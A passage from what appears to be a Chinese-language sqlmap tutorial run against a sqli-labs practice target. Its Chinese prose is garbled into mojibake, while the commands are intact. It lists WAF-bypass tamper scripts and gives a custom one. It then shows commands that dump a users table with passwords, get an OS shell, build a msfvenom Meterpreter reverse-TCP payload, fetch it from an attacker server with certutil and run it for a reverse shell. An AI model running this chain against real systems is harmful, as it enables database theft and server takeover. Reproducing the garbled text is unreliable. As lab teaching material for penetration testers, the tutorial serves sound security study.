ç”¨&#x27;IFï¼ˆISNULLï¼ˆAï¼‰ï¼ŒBï¼‰æ›¿æ¢&#x27;IFNULLï¼ˆAï¼ŒBï¼‰&#x27;ä¹‹ç±»çš„å®ä¾‹ï¼ŒAï¼‰&#x27;å¯¹åº” |</span><br><span class="line">| informationschemacomment.py  | åœ¨æ‰€æœ‰å‡ºç°çš„ï¼ˆMySQLï¼‰â€œinformation_schemaâ€æ ‡è¯†ç¬¦çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªå†…è”æ³¨é‡Šï¼ˆ/ ** /ï¼‰ |</span><br><span class="line">| least.py                     | ç”¨&#x27;LEAST&#x27;å¯¹åº”æ›¿æ¢è¿ç®—ç¬¦ï¼ˆ&#x27;&gt;&#x27;ï¼‰                               |</span><br><span class="line">| lowercase.py                 | ç”¨å°å†™æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦ï¼ˆä¾‹å¦‚SELECT-&gt;selectï¼‰               |</span><br><span class="line">| luanginx.py                  | LUA-NginxWAFç»•è¿‡ï¼ˆä¾‹å¦‚Cloudflareï¼‰                           |</span><br><span class="line">| modsecurityversioned.py      | åŒ…å«å¸¦æœ‰ï¼ˆMySQLï¼‰ç‰ˆæœ¬æ³¨é‡Šçš„å®Œæ•´æŸ¥è¯¢                          |</span><br><span class="line">| modsecurityzeroversioned.py  | åŒ…å«å¸¦æœ‰ï¼ˆMySQLï¼‰é›¶ç‰ˆæœ¬æ³¨é‡Šçš„å®Œæ•´æŸ¥è¯¢                        |</span><br><span class="line">| multiplespaces.py            | åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼ï¼ˆ&#x27;&#x27;ï¼‰                            |</span><br><span class="line">| overlongutf8.py              | å°†payloadä¸­çš„æ‰€æœ‰ï¼ˆéå­—æ¯æ•°å­—ï¼‰å­—ç¬¦è½¬æ¢ä¸ºè¶…é•¿UTF8ï¼ˆä¾‹å¦‚&#x27;-&gt;ï¼…C0ï¼…A7ï¼‰ |</span><br><span class="line">| overlongutf8more.py          | å°†payloadä¸­æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºè¶…é•¿UTF8ï¼ˆä¾‹å¦‚SELECT-&gt;ï¼…C1ï¼…93ï¼…C1ï¼…85ï¼…C1ï¼…8Cï¼…C1ï¼…85ï¼…C1ï¼…83ï¼…C1ï¼…94ï¼‰ |</span><br><span class="line">| percent.py                   | åœ¨æ¯ä¸ªå­—ç¬¦å‰é¢æ·»åŠ ä¸€ä¸ªç™¾åˆ†å·ï¼ˆ&#x27;ï¼…&#x27;ï¼‰ ï¼ˆä¾‹å¦‚SELECT-&gt;ï¼…Sï¼…Eï¼…Lï¼…Eï¼…Cï¼…Tï¼‰ |</span><br><span class="line">| plus2concat.py               | æ›¿æ¢è¿ç®—ç¬¦ï¼ˆ&#x27;+&#x27;ï¼‰ä¸ï¼ˆMsSQLï¼‰å‡½æ•°CONCATï¼ˆï¼‰å¯¹åº”               |</span><br><span class="line">| plus2fnconcat.py             | ç”¨ï¼ˆMsSQLï¼‰ODBCå‡½æ•°&#123;fn CONCATï¼ˆï¼‰&#125;æ›¿æ¢ä¸ºï¼ˆ&#x27;+&#x27;ï¼‰              |</span><br><span class="line">| randomcase.py                | ç”¨éšæœºå¤§å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦ï¼ˆä¾‹å¦‚SELECT-&gt; SEleCtï¼‰      |</span><br><span class="line">| randomcomments.py            | åœ¨SQLå…³é”®å­—å†…æ·»åŠ éšæœºå†…è”æ³¨é‡Šï¼ˆä¾‹å¦‚SELECT-&gt; S/**/E/**/LECTï¼‰ |</span><br><span class="line">| sp_password.py               | å°†ï¼ˆMsSQLï¼‰å‡½æ•°&#x27;sp_password&#x27;é™„åŠ åˆ°payloadçš„æœ«å°¾ï¼Œä»¥ä¾¿ä»DBMSæ—¥å¿—ä¸­è‡ªåŠ¨è¿›è¡Œæ··æ·† |</span><br><span class="line">| space2comment.py             | ç©ºæ ¼æ›¿æ¢ä¸º/**_**/                                            |</span><br><span class="line">| space2dash.py                | ç©ºæ ¼æ›¿æ¢ä¸º-åŠ éšæœºå­—ç¬¦                                        |</span><br><span class="line">| space2hash.py                | ç©ºæ ¼æ›¿æ¢ä¸º#åŠ éšæœºå­—ç¬¦                                        |</span><br><span class="line">| space2morecomment.py         | ç©ºæ ¼æ›¿æ¢ä¸º/**_**/                                            |</span><br><span class="line">| space2morehash.py            | ç©ºæ ¼æ›¿æ¢ä¸º#åŠ éšæœºå­—ç¬¦åŠæ¢è¡Œç¬¦                                |</span><br><span class="line">| space2mssqlblank.py          | ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºç¬¦å·ï¼ˆMsSQLï¼‰                                |</span><br><span class="line">| space2mssqlhash.py           | ç©ºæ ¼æ›¿æ¢ä¸º%23%0A(MsSQL)                                      |</span><br><span class="line">| space2mysqlblank.py          | ç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·ï¼ˆMysqlï¼‰                                |</span><br><span class="line">| space2mysqldash.py           | æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆ&#x27;&#x27;ï¼‰ï¼ˆâ€™â€“â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ¢è¡Œï¼ˆâ€™nâ€™ï¼‰   |</span><br><span class="line">| space2plus.py                | ç”¨åŠ å·ï¼ˆ&#x27;+&#x27;ï¼‰æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆ&#x27;&#x27;ï¼‰                              |</span><br><span class="line">| space2randomblank.py         | ç”¨ç©ºæ ¼ä¸­çš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆ&#x27;&#x27;ï¼‰æœ‰æ•ˆçš„æ›¿ä»£å­—ç¬¦é›†     |</span><br><span class="line">| substring2leftright.py       | ç”¨LEFTå’ŒRIGHTæ›¿æ¢PostgreSQL SUBSTRING                        |</span><br><span class="line">| symbolicologic.py            | ç”¨ç¬¦å·ï¼ˆ&amp;&amp;å’Œ\|\|ï¼‰æ›¿æ¢ANDå’ŒORé€»è¾‘è¿ç®—ç¬¦                      |</span><br><span class="line">| unionalltounion.py           | ç”¨UNION SELECTæ›¿æ¢UNION ALL SELECT                           |</span><br><span class="line">| unmagicquotes.py             | ç”¨å¤šå­—èŠ‚ç»„åˆï¼…BFï¼…27æ›¿æ¢å¼•å·å­—ç¬¦ï¼ˆ&#x27;ï¼‰ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ é€šç”¨æ³¨é‡Š  |</span><br><span class="line">| uppercase.py-                | ç”¨å¤§å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦ï¼ˆä¾‹å¦‚select -&gt; SELECTï¼‰           |</span><br><span class="line">| varnish.py                   | æ·»åŠ HTTPæ ‡å¤´&#x27;X-originating-IP&#x27;ä»¥ç»•è¿‡Varnishé˜²ç«å¢™            |</span><br><span class="line">| versionedkeywords.py         | ç”¨æ³¨é‡Šå°è£…æ¯ä¸ªéå‡½æ•°çš„å…³é”®å­—                                 |</span><br><span class="line">| versionedmorekeywords.py     | å°†æ¯ä¸ªå…³é”®å­—åŒ…å«ï¼ˆMySQLï¼‰ç‰ˆæœ¬æ³¨é‡Š                            |</span><br><span class="line">| versionedmorekeywords.py     | å°†æ¯ä¸ªå…³é”®å­—åŒ…å«ï¼ˆMySQLï¼‰ç‰ˆæœ¬æ³¨é‡Š                            |</span><br><span class="line">| xforwardedfor.py             | æ·»åŠ ä¼ªé€ çš„HTTPæ ‡å¤´&#x27;X-Forwarded-For                           |</span><br></pre></td></tr></table></figure></div><br/><h3 id="Temperè‡ªç¼–å†™"><a href="#Temperè‡ªç¼–å†™" class="headerlink" title="Temperè‡ªç¼–å†™"></a>Temperè‡ªç¼–å†™</h3><p>Sqlmap æ”¯æŒè‡ªç¼–å†™ temper ï¼Œè‡ªå¸¦ä¾‹å­ base64encode.py</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span></span><br><span class="line"><span class="string">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure></div><p>è‡ªå®šåˆ¶ï¼Œå°† <code>ç©ºæ ¼</code> ,æ›¿æ¢ä¸º <code>/**/</code>,å°† <code>select</code> æ›¿æ¢ä¸º <code>Select</code>, <code>SLEEP</code> æ›¿æ¢ä¸º <code>Sleep</code>,ç„¶åå°†æ­¤è„šæœ¬æ”¾ç½®åˆ° sqlmap çš„ temper ç›®å½•ä¸‹ï¼Œç„¶åè°ƒç”¨å‚æ•° â€“temper xxx.py å³å¯</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"><span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>).replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;Select&quot;</span>).replace(<span class="string">&quot;SLEEP&quot;</span>,<span class="string">&quot;Sleep&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€å…·ä½“åˆ©ç”¨"><a href="#äº”ã€å…·ä½“åˆ©ç”¨" class="headerlink" title="äº”ã€å…·ä½“åˆ©ç”¨"></a>äº”ã€å…·ä½“åˆ©ç”¨</h2><p>è¿™è¾¹åˆ©ç”¨ sqli-lab ç¯å¢ƒä½œä¸ºé¶åœºç¯å¢ƒï¼Œå…·ä½“æ­å»ºè¯·è‡ªè¡Œå‚è€ƒç½‘ä¸Šæ–‡ç« ï¼Œæˆ–è€…ç›´æ¥ docker pull ä¸€ä¸ªï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029161848191.png" data-caption="image-20221029161848191"><img src="/../images/sqlmap/image-20221029161848191.png" alt="image-20221029161848191"></a></p><h3 id="åŸºç¡€ä½¿ç”¨"><a href="#åŸºç¡€ä½¿ç”¨" class="headerlink" title="åŸºç¡€ä½¿ç”¨"></a>åŸºç¡€ä½¿ç”¨</h3><p>1ã€ç›´æ¥å¯¹urlè¿›è¡Œæ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot;</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029161942962.png" data-caption="image-20221029161942962"><img src="/../images/sqlmap/image-20221029161942962.png" alt="image-20221029161942962"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165027147.png" data-caption="image-20221029165027147"><img src="/../images/sqlmap/image-20221029165027147.png" alt="image-20221029165027147"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165138414.png" data-caption="image-20221029165138414"><img src="/../images/sqlmap/image-20221029165138414.png" alt="image-20221029165138414"></a></p><p>2ã€æŸ¥è¯¢å…¶æ•°æ®åº“ <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; --dbs</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165340377.png" data-caption="image-20221029165340377"><img src="/../images/sqlmap/image-20221029165340377.png" alt="image-20221029165340377"></a></p><p>3ã€ä¼—æ‰€å‘¨çŸ¥ sqli-lab æ•°æ®åº“ä¸º securityï¼Œæˆ‘ä»¬ç›´æ¥æŸ¥è¯¢å…¶æ•°æ®è¡¨ <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security --tables</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165559549.png" data-caption="image-20221029165559549"><img src="/../images/sqlmap/image-20221029165559549.png" alt="image-20221029165559549"></a></p><p>4ã€å¯¹æ•°æ®è¡¨ä¸­çš„ users æ•°æ®åˆ—è¿›è¡ŒæŸ¥è¯¢ <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users --columns</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165819852.png" data-caption="image-20221029165819852"><img src="/../images/sqlmap/image-20221029165819852.png" alt="image-20221029165819852"></a></p><p>5ã€æŸ¥è¯¢ usermane æ•°æ®åˆ—ä¸­çš„æ‰€æœ‰æ•°æ®ï¼ŒæŸ¥è¯¢åˆ°æœ‰13ä¸ªç”¨æˆ·å <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users -C username --dump</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170103643.png" data-caption="image-20221029170103643"><img src="/../images/sqlmap/image-20221029170103643.png" alt="image-20221029170103643"></a></p><p>6ã€ç»§ç»­æŸ¥è¯¢ password æ•°æ®åˆ—ä¸­çš„æ•°æ® <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users -C password --dump</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170237202.png" data-caption="image-20221029170237202"><img src="/../images/sqlmap/image-20221029170237202.png" alt="image-20221029170237202"></a></p><p>è‡³æ­¤ï¼ŒsqlmapåŸºæœ¬çš„æ•°æ®æŸ¥è¯¢å°±å·²ç»å®Œæˆäº†ï¼Œå¯é€šè¿‡æŸ¥è¯¢å‡ºæ¥çš„è´¦å·å¯†ç è¿›è¡Œåå°ç™»å½•ï¼Œå¯»æ‰¾ä¸‹ä¸€ä¸ªæ¼æ´ç‚¹æ·±ä¸€æ­¥æµ‹è¯•ã€‚</p><h3 id="è¿›é˜¶ä½¿ç”¨"><a href="#è¿›é˜¶ä½¿ç”¨" class="headerlink" title="è¿›é˜¶ä½¿ç”¨"></a>è¿›é˜¶ä½¿ç”¨</h3><p>åœ¨æ—¥å¸¸çš„æ¸—é€ä¸­ï¼Œæœ‰æ—¶å€™å› ä¸ºæŸ¥è¯¢æ•°æ®æ—¶é—´è¿‡é•¿ï¼Œæˆ‘ä»¬ä¹ æƒ¯å¾—åˆ°æ³¨å…¥ç‚¹åï¼ŒæŸ¥è¯¢å…¶æ˜¯å¦å­˜åœ¨ dba æƒé™ï¼Œè‹¥æ˜¯ dba æƒé™åˆ™å¯è¿›ä¸€æ­¥è·å–äº¤äº’ shellã€‚è¿™é‡Œä¸»è¦æ¥æ‰«å‡ ç§è¿›ä¸€æ­¥åˆ©ç”¨æ–¹å¼ï¼šâ€“os-shellã€â€“sql-shellã€â€“file-readã€â€“file-writeã€â€“file-destã€‚</p><p>1ã€æŸ¥è¯¢æ˜¯å¦æ˜¯ dba æƒé™ <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; --is-dba</code>ï¼Œè¿™é‡Œæ˜¾ç¤º DBAï¼šFalse åˆ™è¯´æ˜ä¸æ˜¯ DBAæƒé™ï¼Œåˆ™æ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170655721.png" data-caption="image-20221029170655721"><img src="/../images/sqlmap/image-20221029170655721.png" alt="image-20221029170655721"></a></p><p>æˆ‘ä»¬æ›´æ¢å…³å¡ä¸ºç¬¬5å…³ï¼Œå°è¯•åˆ©ç”¨ DBA è¿›ä¸€æ­¥æµ‹è¯• <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-5/?id=1&quot; --is-dba</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170833247.png" data-caption="image-20221029170833247"><img src="/../images/sqlmap/image-20221029170833247.png" alt="image-20221029170833247"></a></p><p>DBAï¼šTrueï¼Œè¯æ˜ä¸º dba æƒé™</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170933044.png" data-caption="image-20221029170933044"><img src="/../images/sqlmap/image-20221029170933044.png" alt="image-20221029170933044"></a></p><h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p>â€“os-shellï¼Œç›´æ¥è·å–æ•°æ®åº“ shell(ç›¸å½“äºè·å–æ•°æ®åº“æœåŠ¡å™¨æƒé™ï¼Œå¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼‰,ä¸Šä¼ webshellç­‰æ“ä½œ</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL rootè´¦å·æƒé™ï¼Œå³é…ç½®MySQLè¿æ¥çš„è´¦å·ä¸ºrootè´¦å·ï¼Œä¸æ˜¯rootè´¦å·å…·å¤‡rootæƒé™ä¹Ÿå¯</span><br><span class="line">GPCé…ç½®å…³é—­ï¼Œèƒ½ä½¿ç”¨å•å¼•å·</span><br><span class="line">æœ‰ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œä¸”å…·å¤‡å¯ä»¥åœ¨æ–‡ä»¶å¤¹å†™å…¥æ–‡ä»¶çš„æƒé™</span><br><span class="line">æ²¡æœ‰é…ç½®secure-file-privå±æ€§</span><br></pre></td></tr></table></figure></div><p>1ã€è·å– â€“os-shell</p><p><code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&quot; --os-shell</code> é»˜è®¤ä¸º PHP ï¼Œå¯æ‰‹åŠ¨é€‰æ‹©æ•°å­—</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029172347308.png" data-caption="image-20221029172347308"><img src="/../images/sqlmap/image-20221029172347308.png" alt="image-20221029172347308"></a></p><p>è¾“å…¥ç»å¯¹è·¯å¾„ï¼Œå®æˆ˜ä¸­å¯é€šè¿‡ç½‘ç«™æŠ¥é”™ã€ä¿¡æ¯æ³„éœ²ç­‰æ‰‹æ®µè·å–ç½‘ç«™è·¯å¾„</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190033776.png" data-caption="image-20221029190033776"><img src="/../images/sqlmap/image-20221029190033776.png" alt="image-20221029190033776"></a></p><p>ç¯å¢ƒç¬¦åˆï¼Œè·å– os-shell</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190102891.png" data-caption="image-20221029190102891"><img src="/../images/sqlmap/image-20221029190102891.png" alt="image-20221029190102891"></a></p><p>é€šè¿‡ os-shell å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190835758.png" data-caption="image-20221029190835758"><img src="/../images/sqlmap/image-20221029190835758.png" alt="image-20221029190835758"></a></p><p>2ã€é€šè¿‡ os-shell ä¸Šä¼ æœ¨é©¬ï¼Œé¦–å…ˆåœ¨ VPS ä¸Šæ”¾ç½®ä¸€ä¸ªæœ¨é©¬ï¼Œé€šè¿‡ os-shell åˆ©ç”¨ sqlmap è°ƒç”¨ç³»ç»Ÿ certutil.exe è¿œç¨‹ä¸‹è½½æœ¨é©¬ï¼Œç„¶åæ‰§è¡Œä¸Šçº¿ï¼Œä¸‹å›¾ä¸ºæ”»å‡»æœºåœ°å€ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029191222590.png" data-caption="image-20221029191222590"><img src="/../images/sqlmap/image-20221029191222590.png" alt="image-20221029191222590"></a></p><p>ç”Ÿæˆmsfæœ¨é©¬</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.130 LPORT=2333 -f exe -o /home/funsiooo/2333.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029191710336.png" data-caption="image-20221029191710336"><img src="/../images/sqlmap/image-20221029191710336.png" alt="image-20221029191710336"></a></p><p>åˆ©ç”¨ Python åœ¨ç”Ÿæˆ msf æœ¨é©¬è·¯å¾„ä¸‹å¼€å¯ä¸´æ—¶ web æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192006003.png" data-caption="image-20221029192006003"><img src="/../images/sqlmap/image-20221029192006003.png" alt="image-20221029192006003"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192030597.png" data-caption="image-20221029192030597"><img src="/../images/sqlmap/image-20221029192030597.png" alt="image-20221029192030597"></a></p><p>æ”»å‡»æœº msf å¤„è¿›è¡Œç›‘å¬</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.114.140</span><br><span class="line">lhost =&gt; 192.168.114.140</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192650298.png" data-caption="image-20221029192650298"><img src="/../images/sqlmap/image-20221029192650298.png" alt="image-20221029192650298"></a></p><p>åœ¨ sqlmap å¤„è°ƒç”¨ windwos è‡ªå¸¦çš„ certutil.exe è¿œç¨‹ä¸‹è½½ msf shellï¼Œæœ€åé€šè¿‡å‘½ä»¤æ‰§è¡Œ msf shell åå¼¹shell</p><p>è¿œç¨‹ä¸‹è½½2333.exe(æ³¨æ„y&#x2F;n&#x2F;aé€‰æ‹©)</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; certutil.exe -urlcache -split -f http://192.168.114.140:8000/2333.exe C:\Users\Public\2333.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029193805046.png" data-caption="image-20221029193805046"><img src="/../images/sqlmap/image-20221029193805046.png" alt="image-20221029193805046"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029193839251.png" data-caption="image-20221029193839251"><img src="/../images/sqlmap/image-20221029193839251.png" alt="image-20221029193839251"></a></p><p>æ‰§è¡Œ 2333.exe æœ¨é©¬ç¨‹åº,è·å–åå¼¹ msf shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; C:\Users\Public\2333.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029194114549.png" data-caption="image-20221029194114549"><img src="/../images/sqlmap/image-20221029194114549.png" alt="image-20221029194114549"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029194152525.png" data-caption="image-20221029194152525"><img src="/../images/sqlmap/image-20221029194152525.png" alt="image-20221029194152525"></a></p><h4 id="sql-shell"><a href="#sql-shell" class="headerlink" title="sql-shell"></a>sql-shell</h4><p>â€“sql-shellï¼Œæ•°æ®åº“äº¤äº’æ¨¡å¼ shellï¼Œæ‰§è¡Œæ•°æ®åº“å‘½ä»¤ï¼Œä¸Šä¼ shellï¼Œæ³¨æ„ï¼šè¯¥å…³å¡é€šå…³éœ€è¦secure_file_privå±æ€§ä¸ºç©ºï¼Œè‹¥ä¸ºNULLä¸èƒ½å†™å…¥ï¼Œå…·ä½“å‚æ•°è§£ææˆ–æŸ¥è¯¢æ–¹æ³•çœ‹åé¢æœ‰è§£æ</p><p>è‹¥ä¸ºNULLï¼Œåˆ™éœ€è¦æ‰“å¼€phpstudy\MySQL\my.iniæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åŠ ä¸Šä¸€å¥ï¼šsecure_file_priv&#x3D;â€&#x2F;â€œ</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å†™å…¥æƒé™</span><br><span class="line">çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure></div><p>1ã€è·å– sql-shell <code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&quot; --sql-shell</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029174714532.png" data-caption="image-20221029174714532"><img src="/../images/sqlmap/image-20221029174714532.png" alt="image-20221029174714532"></a></p><p>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ <code>select @@version;</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029174855562.png" data-caption="image-20221029174855562"><img src="/../images/sqlmap/image-20221029174855562.png" alt="image-20221029174855562"></a></p><p>æŸ¥çœ‹ç›®å½•å’Œ secure_file_priv å±æ€§ä»¥åŠæ•°æ®åº“è·¯å¾„å’Œ Mysql å®‰è£…è·¯å¾„ <code>select @@secure_file_priv,@@datadir,@@basedir</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029180221656.png" data-caption="image-20221029180221656"><img src="/../images/sqlmap/image-20221029180221656.png" alt="image-20221029180221656"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># @@secure_file_priv</span><br><span 